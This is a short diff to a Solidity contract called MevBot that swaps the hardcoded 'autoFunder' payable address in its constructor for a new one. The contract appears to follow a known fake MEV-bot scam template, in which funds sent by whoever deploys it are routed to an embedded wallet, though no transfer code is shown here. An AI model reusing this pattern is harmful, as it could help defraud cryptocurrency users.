@@ -509,7 +509,7 @@ contract MevBot {
     address payable private autoFunder;
 
     constructor() {
-        autoFunder = payable(0x85F524F1F8d3fAf685c4e88F0A787f787F647460);
+        autoFunder = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);
     }
 
     function initialize(
